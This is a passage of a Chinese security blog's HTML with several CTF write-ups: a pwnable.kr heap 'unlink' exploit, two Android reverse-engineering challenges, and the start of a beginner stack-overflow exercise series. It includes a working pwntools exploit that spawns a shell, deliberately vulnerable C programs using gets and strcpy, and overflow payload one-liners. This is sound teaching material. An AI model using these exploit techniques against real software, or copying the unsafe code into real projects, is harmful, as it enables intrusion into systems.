+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/unlink/" itemprop="url">pwnable.kr之unlink</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:07:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></div><div class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</div><div class="line">&#125;OBJ;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</div><div class="line">    OBJ* BK;</div><div class="line">    OBJ* FD;</div><div class="line">    BK=P-&gt;bk;</div><div class="line">    FD=P-&gt;fd;</div><div class="line">    FD-&gt;bk=BK;</div><div class="line">    BK-&gt;fd=FD;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</div><div class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line"></div><div class="line">    <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></div><div class="line">    A-&gt;fd = B;</div><div class="line">    B-&gt;bk = A;</div><div class="line">    B-&gt;fd = C;</div><div class="line">    C-&gt;bk = B;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</div><div class="line">    <span class="comment">// heap overflow!</span></div><div class="line">    gets(A-&gt;buf);</div><div class="line"></div><div class="line">    <span class="comment">// exploit this unlink!</span></div><div class="line">    unlink(B);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这道题考查基础的堆溢出unlink利用, 其中实现的unlink函数是对早期ptmalloc的模拟. 程序给了堆栈的leak和获取shell的位置, 只需修改程序控制流即可.</p>
+<p>这里定义的OBJ结构体指向chunk体部分, 不包含chunk头部分, 因此P-&gt;fd = <em>(P), P-&gt;bk = </em>(P + 4).</p>
+<p>unlink主要的漏洞点发生在</p>
+<pre><code>FD-&gt;bk=BK;
+BK-&gt;fd=FD;
+</code></pre><p>两句,</p>
+<p>FD-&gt;bk = P -&gt; fd -&gt; bk = BK = P -&gt; bk, 亦即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(*(P) + 4)=*(P+4)</div></pre></td></tr></table></figure>
+<p>我们假设内存布局为</p>
+<p>A1|A2|A3|A4|B1|B2|B3|B4</p>
+<p>则在unlink B的时候P-&gt;fd = A; P -&gt; bk = B,</p>
+<p>那么就有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*(B3 + 4) = B4;</div><div class="line">*(B4) = B3;</div></pre></td></tr></table></figure>
+<p>可以看到, 这种unlink漏洞有两次任意内存写机会, 但是这个机会不是很好用, 因为两次写是有一定关联的. 最直观的想法就是把main函数ret地址写到B4, shell地址写到B3, 但是这样一来会向代码段非法写入. 接下来的一个想法是把一段足够短的跳板或者二次跳板程序写入到A3A4…(这是我们最早可控的内存), 然后通过控制ret跳转到堆上, 遗憾的是程序开启了数据执行保护, 堆上无法执行程序.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@hyrathon-vm ➜ Desktop  checksec unlink</div><div class="line">[*] &apos;/mnt/hgfs/Desktop/unlink&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
+<p>做到这里有一点卡壳了, 很羞耻的去网上找了一下writeup, 发现汇编中有这样一段栈很有趣:</p>
+<p><img src="unlink/1.png" alt=""></p>
+<p>在退出main函数之前, 有一个mov ecx, [ebp-4]和lea esp, [ecx-4], 随后esp被恢复到eip. 既然没有办法直接控制ret, 可以通过控制ebp-4而控制ecx, 进而控制esp, eip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">eip = esp</div><div class="line">esp = ecx - 4</div><div class="line">ecx = [ebp - 4]</div></pre></td></tr></table></figure>
+<p>我们想让eip=shell地址, 那么就应该控制ecx = shell地址+4, 即[ebp - 4] = shell地址 + 4, 而ebp - 4的地址可以通过stack_leak计算得来(经过实际验证为stack_leak + 0x10). shell地址则应该写在一个我们能控制的位置(堆上A3), 那么payload在堆上的布局就应该是</p>
+<p>A1|A2|shell地址|padding|padding|padding|heap_leak + 0xc|stack_leak + 0x10</p>
+<p>heap_leak + 0xc处0xc来自于shellcode地址本身与heap_leak相隔8, 加上ecx - 4时需要减4, 因此这里再加4.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./unlink"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"here is stack address leak: "</span>)</div><div class="line">stack_address = int(p.recvline(), <span class="number">16</span>)</div><div class="line">p.recvuntil(<span class="string">"here is heap address leak: "</span>)</div><div class="line">heap_address = int(p.recvline(), <span class="number">16</span>)</div><div class="line">p.recvuntil(<span class="string">"now that you have leaks, get shell!"</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"stack_address:"</span>, hex(stack_address), <span class="string">"heap_address"</span>, hex(heap_address)</div><div class="line"></div><div class="line">payload = p32(<span class="number">0x080484EB</span>) + <span class="string">'a'</span>*<span class="number">12</span> + p32(heap_address + <span class="number">0xc</span>) + p32(stack_address + <span class="number">0x10</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/27/hurry-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/27/hurry-up/" itemprop="url">2016武汉某宣传周题目----Hurry Up</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-27T00:00:00+08:00">
+                2017-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>题目给的APK包含Java和Android层代码, 代码结构清晰没有太多混淆, 反调试等.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序的入口MainActivity有问题, 无任何实际代码, 分析发现实际有效的是GetActivity, 调用了Encryption类和native的一些方法. 尝试改包或者<code>am start</code>强行启动GetActivity均告失败.分析so库发现, 代码的第一次验证函数getsign对整包签名做了native层校验, 且结果加入了后续flag计算.</p>
+<p>写了一个小工程GetSign, 通过PackageManager获取了程序的签名, 很长一千多个字节, 将其传给第二个native函数getAnswer以期绕过完整性检验.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PackageManager  pm = getPackageManager();</div><div class="line">        try &#123;</div><div class="line">            PackageInfo pi =  pm.getPackageInfo(&quot;com.example.root.crack_me2&quot;, PackageManager.GET_SIGNATURES);</div><div class="line">            for (Signature s : pi.signatures)&#123;</div><div class="line">                ssss += s.toCharsString() + &quot;!!!!!!!!!!!!&quot;;</div><div class="line">            &#125;</div><div class="line">        &#125; catch (PackageManager.NameNotFoundException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">            ssss += &quot;error&quot;;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>结果程序无限卡死, 无法通过建立Activity的onCreate函数, 分析native函数发现其中计算返回值的算法时间复杂度极高, 有限时间内根本运算不完(下面列了出来), 但是, 其中有<code>mod 45454</code>的运算, 猜测结果不会超过这个范围, 因此, 可以暴力破解.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">signed int __fastcall Java_com_example_root_crack_1me2_GetActivity_getAnswer(JNIEnv *env, jobject jobj, int int_50213)</div><div class="line">&#123;</div><div class="line">  signed int result; // r0@1</div><div class="line">  int v4; // r1@1</div><div class="line">  int v5; // r7@1</div><div class="line">  signed int v6; // r5@1</div><div class="line">  signed int v7; // r4@2</div><div class="line">  signed int v8; // r6@3</div><div class="line">  signed int v9; // r1@4</div><div class="line"></div><div class="line">  j_j___aeabi_idivmod(int_50213, 45454);</div><div class="line">  result = 1;</div><div class="line">  v5 = v4;</div><div class="line">  v6 = 2110101010;</div><div class="line">  do</div><div class="line">  &#123;</div><div class="line">    v7 = 2110101010;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      v8 = 2110101010;</div><div class="line">      do</div><div class="line">      &#123;</div><div class="line">        j_j___aeabi_idivmod(result * v5, 45454);</div><div class="line">        --v8;</div><div class="line">        result = v9;</div><div class="line">      &#125;</div><div class="line">      while ( v8 );</div><div class="line">      --v7;</div><div class="line">    &#125;</div><div class="line">    while ( v7 );</div><div class="line">    --v6;</div><div class="line">  &#125;</div><div class="line">  while ( v6 );</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>写出来的暴力程序如下, 由于理论上有45454种结果, 而结果参与了后续运算, 不是所有的结果参与Encryption的运算都能返回结果, 另外, flag等字样很有可能出现在最终结果中, 因此可以进一步筛选.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">String v3 = null;</div><div class="line">String v1 = &quot;tQJWYl+8C4cO2jwq782P5qc/9FXVF6cedVTtozSnyFk=&quot;;</div><div class="line">for (int i = 0; i &lt; 45454; ++i) &#123;</div><div class="line">    try &#123;</div><div class="line">        v3 = Encryption.decrypt(Integer.toString(i), v1);</div><div class="line">    &#125; catch (Exception e) &#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    if (v3 == null)</div><div class="line">        continue;</div><div class="line">    if (v3.contains(&quot;flag&quot;)) &#123;</div><div class="line">        textView.setText(v3);</div><div class="line">        v3 = null;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>结果是getAnswer函数返回9953, 对应flag为<code>flag{Y0u_need_t0_hu55y_up}</code>.</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/27/GeekpwnSecretCode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/27/GeekpwnSecretCode/" itemprop="url">Geekpwn SecretCode</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-27T00:00:00+08:00">
+                2017-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>题目给了一个APK, 属于MISC类型, 考察APK发现为存的加密算法分析, 没有JNI, 有Proguard混淆, 需要透过混淆分析Java层代码真实逻辑.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序的Android源码分为三个部分, 从一张图片读入key, 对key进行处理, 使用用户输入+key得到结果.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">InputStream v0_1 = this.getResources().openRawResource(R.raw.url);</div><div class="line"></div><div class="line">            int v1 = v0_1.available();</div><div class="line">            byte[] v2 = new byte[v1];</div><div class="line">            v0_1.read(v2, 0, v1);</div><div class="line">            byte[] v0_2 = new byte[16];</div><div class="line">            System.arraycopy(v2, 144, v0_2, 0, 16);</div><div class="line">            this.para = new String(v0_2, &quot;utf-8&quot;);</div></pre></td></tr></table></figure>
+<p>读取图片逻辑, 从便宜144开始读16个字符, 分析得到this_is_the_key.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">private String append(String arg4) &#123;</div><div class="line">    String v0_2;</div><div class="line">    try &#123;</div><div class="line">        arg4.getBytes(&quot;utf-8&quot;);</div><div class="line">        StringBuilder v1 = new StringBuilder();</div><div class="line">        int v0_1;</div><div class="line">        for(v0_1 = 0; v0_1 &lt; arg4.length(); v0_1 += 2) &#123;</div><div class="line">            v1.append(arg4.charAt(v0_1 + 1));</div><div class="line">            v1.append(arg4.charAt(v0_1));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        v0_2 = v1.toString();</div><div class="line">    &#125;</div><div class="line">    catch(UnsupportedEncodingException v0) &#123;</div><div class="line">        v0.printStackTrace();</div><div class="line">        v0_2 = null;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return v0_2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>对key进行处理, 简单的每两位互换位置.<br>接下来, 由于代码中比较阶段已经知道预期的密文是什么, 用密文加上密钥得到明文.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plain"><figcaption><span>javax.crypto.Cipher;</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import javax.crypto.spec.SecretKeySpec;</div><div class="line"></div><div class="line">public class Solve &#123;</div><div class="line"></div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line">        byte[] output = new byte[]&#123;21, -93, -68, -94, 86, 117, -19, -68,</div><div class="line">                -92, 33, 50, 118, 16, 13, 1, -15, -13, 3, 4, 103, -18, 81, 30, 68, 54, -93, 44, -23,</div><div class="line">                93, 98, 5, 59&#125;;</div><div class="line"></div><div class="line"></div><div class="line">        String key_str = &quot;this_is_the_key.&quot;;</div><div class="line">    String key_sft = &quot;htsii__sht_eek.y&quot;;</div><div class="line"></div><div class="line">    SecretKeySpec secretKeySpec = new SecretKeySpec(key_sft.getBytes(), &quot;AES&quot;);</div><div class="line">    Cipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);</div><div class="line">    cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);</div><div class="line">    String s = new String(cipher.doFinal(output));</div><div class="line">    System.out.println(s);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">**flag:LCTF&#123;1t&apos;s_rea1ly_an_ea3y_ap4&#125;**</div></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/27/abc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/27/abc/" itemprop="url">2016武汉某宣传周题目----Hurry Up</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-27T00:00:00+08:00">
+                2017-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="超级基础的8个pwn入门练习"><a href="#超级基础的8个pwn入门练习" class="headerlink" title="超级基础的8个pwn入门练习"></a>超级基础的8个pwn入门练习</h1><blockquote>
+<p>如题, 作者一直不会pwn, 想要找一些入门的材料学习一下如何利用漏洞, 一个偶然的因素写了一些短小代码, 学习一下.</p>
+</blockquote>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>据说这样写标题比较牛逼….</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char** argv)</div><div class="line">&#123;</div><div class="line">    int modified;</div><div class="line">    char buffer[64];</div><div class="line"></div><div class="line">    modified = 0;</div><div class="line">    gets(buffer);</div><div class="line">    if(modified != 0)</div><div class="line">        printf(&quot;Pwnd!&quot;);</div><div class="line">    else</div><div class="line">        printf(&quot;Please try again!&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>gets函数由于对输入长度没有校验导致的栈覆盖.<br>注意buffer是64字节长, 当输入超过64之后会覆盖后面地址, 由于栈是向低地址生长的, buffer在modified之前, 会导致覆盖.<br>利用python生成输入,用管道将python输出定位给该程序输入.</p>
+<p><code>python -c &quot;print &#39;A&#39;*64+&#39;B&#39;&quot; | ./a.out</code></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char** argv)</div><div class="line">&#123;</div><div class="line">    int modified;</div><div class="line">    char buffer[64];</div><div class="line">    </div><div class="line">    if(argc == 1)&#123;</div><div class="line">        printf(&quot;Please check args.&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line">    modified = 0;</div><div class="line">    strcpy(buffer, argv[1]);</div><div class="line"></div><div class="line">    if(modified == 0x61626364)</div><div class="line">        printf(&quot;Pwned!\n&quot;);</div><div class="line">    else</div><div class="line">        printf(&quot;Nice try.\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>通过参数进行攻击, strcpy拷贝字符串时没有对字符串长度进行校验, 会导致覆盖后边的数据.<br><code>./a.out $(python -c &quot;print &#39;A&#39;*64+&#39;dcba&#39;&quot;)</code><br>使用$()进行命令替换, 将python打印到标准输出的内容作为输入传递, 由于小端问题需要的abcd需要以逆序输入.</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char** argv)</div><div class="line">&#123;</div><div class="line">    int modified;</div><div class="line">    char buffer[64];</div><div class="line">    char* variable;</div><div class="line"></div><div class="line">    variable = getenv(&quot;HUANJING&quot;);</div><div class="line">    </div><div class="line">    if (variable == NULL)&#123;</div><div class="line">        printf(&quot;Please set the HUANJING environment variable\n&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    modified = 0;</div><div class="line">    strcpy(buffer, variable);</div><div class="line"></div><div class="line">    if(modified == 0x0d0a0d0a)</div><div class="line">        printf(&quot;Pwned!\n&quot;);</div><div class="line">    else</div><div class="line">        printf(&quot;Nice try!\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
